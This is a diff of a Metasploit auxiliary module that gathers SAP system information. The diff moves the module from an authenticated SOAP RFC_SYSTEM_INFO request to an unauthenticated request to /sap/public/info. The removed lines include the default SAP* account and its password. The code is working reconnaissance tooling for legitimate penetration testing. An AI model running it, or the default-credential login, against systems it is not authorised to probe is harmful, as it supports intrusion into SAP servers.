@@ -26,31 +26,26 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering',
+			'Name' => 'SAP /sap/public/info RFC_SYSTEM_INFO Function Sensitive Information Gathering',
 			'Description' => %q{
-				This module makes use of the RFC_SYSTEM_INFO Function to obtain the operating
-				system version, SAP version, IP address and other information through the use of
-				the /sap/bc/soap/rfc SOAP service.
+				This module uses the RFC_SYSTEM_INFO function within SAP Internet Communication
+				Framework (ICF) to obtain the operating system version, SAP version, IP address
+				and other information through /sap/public/info
+
 			},
-			'References' =>
-				[
-					[ 'CVE', '2006-6010' ],
-					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
-				],
 			'Author' =>
 				[
+					# original sap_soap_rfc_system_info module
 					'Agnivesh Sathasivam',
 					'nmonkee',
-					'ChrisJohnRiley' # module cleanup / streamlining
+					# repurposed for /sap/public/info (non-RFC)
+					'ChrisJohnRiley'
 				],
 			'License' => MSF_LICENSE
 			)
 		register_options(
 			[
-				Opt::RPORT(8000),
-				OptString.new('CLIENT', [true, 'SAP Client ', '001']),
-				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
-				OptString.new('PASSWORD', [true, 'Password', '06071992']),
+				OptString.new('PATH', [true, 'Path to SAP Application Server', '/'])
 			], self.class)
 	end
 
@@ -76,37 +71,13 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
-		client = datastore['CLIENT']
-		data = '<?xml version="1.0" encoding="utf-8" ?>'
-		data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
-		data << '<env:Body>'
-		data << '<n1:RFC_SYSTEM_INFO xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
-		data << '<CURRENT_RESOURCES xsi:nil="true"></CURRENT_RESOURCES>'
-		data << '<MAXIMAL_RESOURCES xsi:nil="true"></MAXIMAL_RESOURCES>'
-		data << '<RECOMMENDED_DELAY xsi:nil="true"></RECOMMENDED_DELAY>'
-		data << '<RFCSI_EXPORT xsi:nil="true"></RFCSI_EXPORT>'
-		data << '</n1:RFC_SYSTEM_INFO>'
-		data << '</env:Body>'
-		data << '</env:Envelope>'
-		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
-		print_status("[SAP] #{ip}:#{rport} - sending SOAP RFC_SYSTEM_INFO request")
+
+		print_status("[SAP] #{ip}:#{rport} - Sending RFC_SYSTEM_INFO request to SAP Application Server")
+		uri = normalize_uri(datastore['PATH'] + '/sap/public/info')
 		begin
-			res = send_request_raw({
-				'uri' => '/sap/bc/soap/rfc?sap-client=' + client + '&sap-language=EN',
-				'method' => 'POST',
-				'data' => data,
-				'headers' =>
-					{
-						'Content-Length' => data.size.to_s,
-						'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-						'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + client,
-						'Authorization' => 'Basic ' + user_pass,
-						'Content-Type' => 'text/xml; charset=UTF-8'
-					}
-				}, 45)
-			if res and res.code != 500 and res.code != 200
-				# to do - implement error handlers for each status code, 404, 301, etc.
-				print_error("[SAP] #{ip}:#{rport} - something went wrong!")
+			res = send_request_raw({ 'uri' => uri }, 20)
+			if res and res.code != 200
+				print_error("[SAP] #{ip}:#{rport} - Server did not respond as expected")
 				return
 			elsif not res
 				print_error("[SAP] #{ip}:#{rport} - Server did not respond")
@@ -122,7 +93,7 @@ class Metasploit4 < Msf::Auxiliary
 		# create table for output
 		@saptbl = Msf::Ui::Console::Table.new(
 			Msf::Ui::Console::Table::Style::Default,
-				'Header' => "[SAP] SOAP RFC_SYSTEM_INFO",
+				'Header' => "[SAP] ICF RFC_SYSTEM_INFO",
 				'Prefix' => "\n",
 				'Postfix' => "\n",
 				'Indent' => 1,
